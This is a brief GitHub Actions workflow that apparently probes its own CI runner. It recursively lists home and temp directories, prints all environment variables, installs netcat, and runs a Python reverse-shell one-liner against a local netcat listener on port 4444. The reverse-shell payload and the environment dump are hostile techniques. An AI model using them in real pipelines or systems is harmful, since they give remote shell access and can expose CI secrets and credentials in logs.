name: My Workflow

on: [push, workflow_dispatch]

jobs:
  my_job:
    name: tamir
    runs-on: ubuntu-latest
    steps:
      - name: Step 1
        run: ls -lRa $HOME
      - name: Step 2
        run: ls -lRa ${{ runner.temp }}
      - name: env
        run: printenv
      - run: sudo apt-get update && sudo apt-get install -y netcat
      - run: |
          date
          nc -lp 4444 &
          sleep 1
          python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
          sleep 1
          pkill -9 nc
          pkill -9 nc
